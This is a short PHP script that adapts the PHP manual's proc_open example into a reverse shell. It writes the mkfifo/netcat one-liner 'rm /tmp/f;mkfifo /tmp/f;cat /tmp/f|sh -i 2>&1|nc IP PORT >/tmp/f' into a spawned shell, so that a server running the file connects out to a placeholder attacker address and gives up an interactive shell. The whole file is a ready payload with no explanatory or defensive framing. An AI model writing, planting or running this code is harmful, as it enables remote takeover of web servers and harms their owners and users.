<?php
$descriptorspec = array(
0 => array("pipe", "r"), // stdin is a pipe that the child will read from
1 => array("pipe", "w"), // stdout is a pipe that the child will write to
2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open("sh", $descriptorspec, $pipes);
if (is_resource($process)) {
// $pipes now looks like this:
// 0 => writeable handle connected to child stdin
// 1 => readable handle connected to child stdout
// Any error output will be appended to /tmp/error-output.txt
fwrite($pipes[0], "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f");
fclose($pipes[0]);
while (!feof($pipes[1])) {
echo fgets($pipes[1], 1024);
}
fclose($pipes[1]);
// It is important that you close any pipes before calling
// proc_close in order to avoid a deadlock
$return_value = proc_close($process);

echo "command returned $return_value\n";
}
?>
